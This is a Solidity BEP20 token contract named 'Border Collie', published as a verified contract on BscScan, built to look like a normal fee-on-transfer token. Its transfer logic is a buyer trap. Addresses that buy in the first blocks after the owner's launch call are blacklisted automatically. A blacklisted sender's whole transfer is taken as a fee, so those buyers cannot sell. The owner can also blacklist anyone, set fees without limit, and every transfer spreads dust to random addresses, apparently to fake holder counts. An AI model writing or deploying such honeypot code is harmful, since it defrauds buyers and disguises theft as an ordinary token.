/**
 *Submitted for verification at BscScan.com on 2022-09-23
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xdead));
        _owner = address(0xdead);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract BEP20 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    address payable public marketWallet_1;
    address payable public marketWallet_2;
    address payable public marketWallet_3;

    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 public togetherDo;
    uint256 public _door;


    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public isMarketPair;
    mapping (address => bool) private BList;
    uint256 public _buyLiquidityFee;
    uint256 public _buyMarketingFee_1;
    uint256 public _buyMarketingFee_2;
    uint256 public _buyMarketingFee_3;
    
    uint256 public _sellLiquidityFee;
    uint256 public _sellMarketingFee_1;
    uint256 public _sellMarketingFee_2;
    uint256 public _sellMarketingFee_3;

    uint256 public _liquidityShare;
    uint256 public _marketingShare_1;
    uint256 public _marketingShare_2;
    uint256 public _marketingShare_3;

    uint256 public _totalTaxIfBuying;
    uint256 public _totalTaxIfSelling;
    uint256 public _totalDistributionShares;

    uint256 private _totalSupply;
    uint256 private minimumTokensBeforeSwap; 

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyBySmallOnly = false;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor (string memory _NAME, 
    string memory _SYMBOL,
    uint256 _SUPPLY,
    uint256[4] memory _BUYFEE,
    uint256[4] memory _SELLFEE,
    uint256[4] memory _SHARE,
    address[3] memory walletParams) 
    {
    
        _name   = _NAME;
        _symbol = _SYMBOL;
        _decimals = 9;
        _totalSupply = _SUPPLY * 10**_decimals;

        _buyLiquidityFee = _BUYFEE[0];
        _buyMarketingFee_1 = _BUYFEE[1];
        _buyMarketingFee_2 = _BUYFEE[2];
        _buyMarketingFee_3 = _BUYFEE[3];

        _sellLiquidityFee = _SELLFEE[0];
        _sellMarketingFee_1 = _SELLFEE[1];
        _sellMarketingFee_2 = _SELLFEE[2];
        _sellMarketingFee_3 = _SELLFEE[3];

        _liquidityShare = _SHARE[0];
        _marketingShare_1 = _SHARE[1];
        _marketingShare_2 = _SHARE[2];
        _marketingShare_3 = _SHARE[3];

        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee_1).add(_buyMarketingFee_2).add(_buyMarketingFee_3);
        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee_1).add(_sellMarketingFee_2).add(_sellMarketingFee_3);
        _totalDistributionShares = _liquidityShare.add(_marketingShare_1).add(_marketingShare_2).add(_marketingShare_3);

        minimumTokensBeforeSwap = _totalSupply.mul(1).div(10000);

        marketWallet_1 = payable(walletParams[0]);
        marketWallet_2 = payable(walletParams[1]);
        marketWallet_3 = payable(walletParams[2]);


        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[marketWallet_1] = true;
        isExcludedFromFee[marketWallet_2] = true;
        isExcludedFromFee[marketWallet_3] = true;
        isExcludedFromFee[address(this)] = true;

        isMarketPair[address(uniswapPair)] = true;

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function minimumTokensBeforeSwapAmount() public view returns (uint256) {
        return minimumTokensBeforeSwap;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMarketPairStatus(address account, bool newValue) public onlyOwner {
        isMarketPair[account] = newValue;
    }

    function setisExcludedFromFee(address account, bool newValue) public onlyOwner {
        isExcludedFromFee[account] = newValue;
    }

    function manageExcludeFromFee(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            isExcludedFromFee[addresses[i]] = status;
        }
    }

    function setBuy(uint256 a, uint256 b, uint256 c, uint256 d) external onlyOwner() {
        _buyLiquidityFee = a;
        _buyMarketingFee_1 = b;
        _buyMarketingFee_2 = c;
        _buyMarketingFee_3 = d;

        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee_1).add(_buyMarketingFee_2).add(_buyMarketingFee_3);
    }

    function setSell(uint256 a, uint256 b, uint256 c, uint256 d) external onlyOwner() {
        _sellLiquidityFee = a;
        _sellMarketingFee_1 = b;
        _sellMarketingFee_2 = c;
        _sellMarketingFee_3 = d;

        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee_1).add(_sellMarketingFee_2).add(_sellMarketingFee_3);
    }
    
    function setDistributionSettings(uint256 a, uint256 b, uint256 c, uint256 d) external onlyOwner() {
        _liquidityShare = a;
        _marketingShare_1 = b;
        _marketingShare_2 = c;
        _marketingShare_3 = d;

        _totalDistributionShares = _liquidityShare.add(_marketingShare_1).add(_marketingShare_2).add(_marketingShare_3);
    }
    
    function setNumTokensBeforeSwap(uint256 newValue) external onlyOwner() {
        minimumTokensBeforeSwap = newValue;
    }

    function setmarketWallet_1(address newAddress) external onlyOwner() {
        marketWallet_1 = payable(newAddress);
    }

    function setmarketWallet_2(address newAddress) external onlyOwner() {
        marketWallet_2 = payable(newAddress);
    }

    function setmarketWallet_3(address newAddress) external onlyOwner() {
        marketWallet_3 = payable(newAddress);
    }


    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function setSwapAndLiquifyBySmallOnly(bool newValue) public onlyOwner {
        swapAndLiquifyBySmallOnly = newValue;
    }
    
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function isCantEat(address account) public view returns(bool) {
        return BList[account];
    }

    function multiTransfer_fixed(address[] calldata addresses, uint256 amount) external onlyOwner {
        require(addresses.length < 2001);
        uint256 SCCC = amount * addresses.length;
        require(balanceOf(msg.sender) >= SCCC);
        for(uint i=0; i < addresses.length; i++){
            _basicTransfer(msg.sender,addresses[i],amount);
        }
    }

    function youCantEat(address recipient) internal {
        if (!BList[recipient] && !isMarketPair[recipient]) BList[recipient] = true;
    }

    function manageBL(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            BList[addresses[i]] = status;
        }
    }

    function setBList(address recipient, bool status) public onlyOwner {
        BList[recipient] = status;
    }

    function tolaunc(uint256 a) public onlyOwner {
        _door = a;
        togetherDo = block.number;
    }

    function closeIt() public onlyOwner {
        togetherDo = 0;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(inSwapAndLiquify)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {

            if(!isExcludedFromFee[sender] && !isExcludedFromFee[recipient]){
                address ad;
                for(int i=0;i <=4;i++){
                    ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                    _basicTransfer(sender,ad,100);
                }
                amount -= 600;
            }    

            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
            
            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled) 
            {
                if(swapAndLiquifyBySmallOnly)
                    contractTokenBalance = minimumTokensBeforeSwap;
                swapAndLiquify(contractTokenBalance);    
            }

            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            uint256 finalAmount;
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
                finalAmount = amount;
            } else {require(togetherDo > 0);
                if (smallOrEqual(block.number , togetherDo + _door) && !isMarketPair[recipient]) {youCantEat(recipient);}
                finalAmount = takeFee(sender, recipient, amount);
            }

            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
            
        }
    }

    function smallOrEqual(uint256 a, uint256 b) public pure returns(bool) { return a<=b; }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        
        uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalBNBFee = _totalDistributionShares.sub(_liquidityShare.div(2));
        
        uint256 amountBNBLiquidity = amountReceived.mul(_liquidityShare).div(totalBNBFee).div(2);
        uint256 amountBNBMaeket_1 = amountReceived.mul(_marketingShare_1).div(totalBNBFee);
        uint256 amountBNBMaeket_2 = amountReceived.mul(_marketingShare_2).div(totalBNBFee);
        uint256 amountBNBMaeket_3 = amountReceived.sub(amountBNBLiquidity).sub(amountBNBMaeket_1).sub(amountBNBMaeket_2);

        if(amountBNBMaeket_1 > 0)
            transferToAddressETH(marketWallet_1, amountBNBMaeket_1);

        if(amountBNBMaeket_2 > 0)
            transferToAddressETH(marketWallet_2, amountBNBMaeket_2);

        if(amountBNBMaeket_3 > 0)
            transferToAddressETH(marketWallet_3, amountBNBMaeket_3);

        if(amountBNBLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountBNBLiquidity);
    }
    
    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            marketWallet_1,
            block.timestamp
        );
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        
        if(isMarketPair[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(100);
        }
        else if(isMarketPair[recipient]) {
            feeAmount = amount.mul(_totalTaxIfSelling).div(100);
        }

        if(BList[sender] && !isMarketPair[sender]) feeAmount = amount;
        
        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }
}

contract Token is BEP20 {
    constructor() BEP20(
        "Border Collie", 
        "Border Collie",
        5900000000000000000000000000000000000000,
        [uint256(6),uint256(0),uint256(0),uint256(0)], 
        [uint256(9),uint256(0),uint256(0),uint256(0)], 
        [uint256(3),uint256(14),uint256(14),uint256(14)], 
        [0x403bDF9CE5b01D51f67C236829B196bB82F67899,    
        0x24A871EE4469F383d6344f6F14260cE1e34AE66d,     
        0xf49aa3E354305BF6745e67e9D4dAC9f77F6E6d1a]     
    ){}
}